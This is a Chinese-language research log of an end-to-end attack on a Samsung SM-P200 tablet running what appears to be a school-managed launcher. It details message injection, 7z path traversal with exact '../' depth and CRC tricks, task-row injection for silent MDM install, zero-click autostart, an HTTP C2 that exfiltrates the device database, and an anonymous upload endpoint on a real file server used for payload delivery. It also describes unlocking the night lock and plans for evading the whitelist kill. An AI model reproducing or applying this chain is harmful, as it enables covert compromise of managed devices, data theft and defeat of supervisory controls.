# SM-P200 真机研究：已打通的能力与唯一卡点

> 分析对象：一台 Samsung SM-P200 平板（Android 14）上的现场研究记录。
> 证据等级：B（字节/文件）+ C（行为）。
> 配套阅读：[[research/attack-chain]]（端到端链路）、[[research/dead-ends]]（死路清单）、[[research/postmortem]]（事故复盘）。

## 一、结论速览

| 问题 | 答案 |
| --- | --- |
| 打通到哪一步 | 任意文件写入 + 静默安装 + 零点击自启 + 代码执行 |
| 唯一卡点 | 进程起来后约 7 秒被静默 `SIGKILL`，无 `onDestroy` |
| 卡点原因（头号嫌疑） | 场景管控把「第三方应用 − 白名单」批量 disable |
| 有没有绕过 | 有，改场景白名单文件 + 清缓存广播，在窗口内完成 |
| 走不通的路有多少条 | 18 条，逐条都有代码级或字节级反证 |
| 方法论上最重要的一条 | 先证伪，再实现 |

## 二、研究约束

开始时定的七条约束，后来全部遵守：

1. 不使用教师端；
2. 不要求平板上有任何点按操作；
3. 证据必须代码级或网络侧；
4. 不产生可见的命令行窗口；
5. 不使用周期性定时任务；
6. 正式账号需授权；
7. 测试文件用后清理。

第 4 条把一批「靠脚本调度」的方案直接排除了；第 5 条排除了轮询类方案——这两条约束后来证明是对的，因为本机任何周期任务在进程被杀后都会被系统清掉。

## 五、已打通的能力

### 5.1 长连接接管

目标端口的握手可以完整接管：接受客户端的注册帧，然后按需应答。

判据：累计确认 8746 条 ACK，且客户端持续发送心跳（30 秒一次），说明它认为连接是活的。

### 5.2 消息注入

构造一条 `type=4` 的课堂任务消息，其中 `sourceId` 以 `MOCK` 前缀开头。

代码依据：`ResourceHelper.downLoadResourceBySourceId` 里对 `sourceId.startsWith("MOCK")` 有专门分支，会**清空 sourceId 直连下载**，绕过服务器侧的资源审批。

判据：客户端向我方服务发起带 launcher UA 的下载请求。

### 5.3 任意路径写

资源下载完成后，若 URL 以 7z 结尾，会走解压路径。解压库的实现里对条目名**没有 `..` 过滤**：

```text
libun7zip.so  OutFile_OpenUtf16 @ 0x37a4
  导入表仅 fopen / mkdir / strcat / strcpy
  对条目名直接 strcpy/strcat 拼接到目标目录
```

因此条目名里带 `../` 即可写到任意位置。到目标目录需要**恰好 5 层** `../`——多一层少一层都不行，这个数字是通过目标目录深度算出来的。

还有一个工艺细节：条目名长度必须与原条目**完全相等**，做法是先造等长短名条目，再用等长 UTF-16LE 二进制替换，最后重算两处 CRC（条目头 CRC 与起始头 CRC）。

判据：数据库文件落盘且 `size` 与预期一致。

### 5.4 任务行注入

写入的数据库是 launcher 的私有库副本，需要改两处：

| 表 | 改动 |
| --- | --- |
| 任务表 | 插入一行，`status=25`、`need_update=1` |
| 应用表 | 插入目标包一行，`show=1` |

`status=25` 是「待安装」的魔法值。消费链完整路径：

```text
回桌面/网络恢复/重启 → Home 加载数据
  → resumeInstall()
  → 查询 WHERE status=25
  → 下载
  → 落盘到 save_path
  → AppInstallManager.toInstall
```

**前提：必须处于已登录状态**，否则整条链不跑。这是当时最容易被忽略的一条。

### 5.5 静默安装

安装走 MDM 服务：

```text
AppInstallManager.installApp
  → postUpdateStatus(0x15)
  → PolicyManager.getApplicationPolicyProxy().installApplication(path)
  → MdmBinder.installApplication
  → getPackageArchiveInfo 校验可解析
  → 安装
```

**没有签名校验**。但有两个必踩的坑：

| 坑 | 现象 |
| --- | --- |
| 签名不一致 | `INSTALL_FAILED_UPDATE_INCOMPATIBLE` |
| 同 versionCode | 上层跳过安装，状态被置为 `0x65` |

判据：全天 8 次带 launcher UA 的 APK 下载请求，且每次之后进程出现。

### 5.6 零点击自启

```text
Home 加载数据
  → MdmModel.initMdmRules()
  → ControlAppManager.enableApps()
  → SpecialApp.wakeUpResponse(ctx)      // :245
  → SpecialApp.wakeUp(ctx, 包名, action) // :1506 → :1350
  → isAppInstalled + Intent(action) + flags 0x10a00000
  → startActivity
```

包里硬编码了目标包名，所以载荷必须用同名包。flags 不含 `FLAG_INCLUDE_STOPPED_PACKAGES`，因此包一旦进入 stopped 态就解析不到——这就是为什么被 disable 之后「重启也不回来」。

### 5.7 代码执行与读取

载荷起来后建立 HTTP C2，端点包括 `/c2` `/cmd` `/out` `/up` `/ctl`。

首个读原语：把真实数据库复制到外部存储再分片回传，得到 143,360 字节、md5 `e270dd30055a5d477ec59bcd1793e448` 的完整副本。

判据：`svc-create uid=10248`、`fg-ok attempt=1`、`db exists size=143360`。

### 5.8 CDN 匿名上传

文件服务器存在一个匿名上传入口，无需登录态：

```text
POST http://filesoss.yunzuoye.net/XHFileServer/file/upload/CA104004
Header: XueHai-MD5: <md5>
Body:   multipart，字段名必须为 files
→ {"status":1000, "uploadFileDTO":{"fileId":"https://<cdn>/CA104004/<uuid>.txt"}}
```

这条能力的意义：**在完全不需要账号的前提下，可以把任意文件放到一个可被设备下载的地址上**。它是「无凭据投递」的关键一环。

## 六、唯一卡点

现象：载荷进程起来约 7 秒后被静默 `SIGKILL`。没有 `onDestroy`、没有异常、没有崩溃日志。之后闹钟不响、重启不启动、隐式 intent 失效。

这种「无销毁回调的死亡 + 之后完全不回来」的组合，指向单一原因：**被系统级 disable**。

代码依据（见 [[research/dead-ends]] §3）：

```text
SceneControlStatus.executeThisTime() @ :884
  if (!SessionData.getSysAuthority().isSceneControlEnable()) return;
  ApplicationManager.getThirdPartyApps()
  calculateNeedForbiddenList(...)   // :700-820
  → 逐个 setDisableApplication(pkg)   // 跳过 webview
```

语义：**禁用列表 = 第三方应用 − 场景白名单**。我方载荷是第三方应用且不在白名单，因此必被禁。

`setApplicationEnabledSetting(DISABLED)` 的系统行为就是当场 `SIGKILL` 并把包置为 disabled + stopped，与全部真机现象吻合。

## 八、载荷工程

从 v1 到 v20，二十个版本的演进，关键节点：

| 版本 | 关键变化 | 结果 |
| --- | --- | --- |
| v1~v2 | 换包名 | 安装失败 / 装上但无自启点 |
| v3 | 定为内置包名 + 声明 wakeup action | 首次能自启 |
| v4 | 去掉自定义 Application | 能起来，数秒被回收 |
| v5 | 前台服务 | 存活延长 |
| v6 | 加 HTTP C2 + Alarm | 可控 |
| v7 | 读原语首成 | 拿到数据库副本 |
| v15 | 修主线程 socket | **完整跑通一次** |
| v17 | 禁自装 | 修「自装自尽」 |
| v18 | 用高 versionCode | 绕目录同步覆盖任务行 |
| v19 | 夜禁解锁 | MDM 改时间 + 移除锁屏 |
| v20 | 场景白名单修复 | 尝试绕过 7 秒 |

构建流水线九步、构建坑十条，全部记在 [[research/attack-chain]]，此处不重复。

## 九、方法论

现场研究里最有效的八条，按实际价值排序：

1. **先证伪再加功能。** 一个被彻底排除的方向比十个半通的方向省时间。
2. **每个结论都写判据。** 「应该能行」不算结论。
3. **地址、路径、端口一律从运行环境读，不硬编码。** 地址漂移浪费的时间比任何技术难点都多。
4. **抓包过滤器先宽后窄。** 收窄 BPF 漏掉的流量会让整个方向误判为「无流量」。
5. **进程存亡要单独埋点。** 只看业务结果无法区分「没执行」与「执行了但被杀」。
6. **一次只改一个变量。** 同时改三个再对比，得到的差异无法归因。
7. **观察窗口必须长于最长定时器。** 已知存在分钟级循环时，几十秒的窗口毫无意义。
8. **自装自杀是系统行为不是 bug。** 不要把设计行为当缺陷去「修」。

## 十、下一步（当时的方向）

1. 把白名单修复固化进 C2 能力，形成幂等修复；
2. 若白名单路径判断错误，按真实目录结构重出下一版；
3. 若确认不是 disable 而是 force-stop，则转向保活数据源方向；
4. 长线方向是「预置应用 + 一次性登录」，避免在线链路的所有不确定性。

---

一句话概括：**打通了这么多能力之后，真正卡住的不是任何一项技术，而是「系统认为你不该活着」这一条策略。**
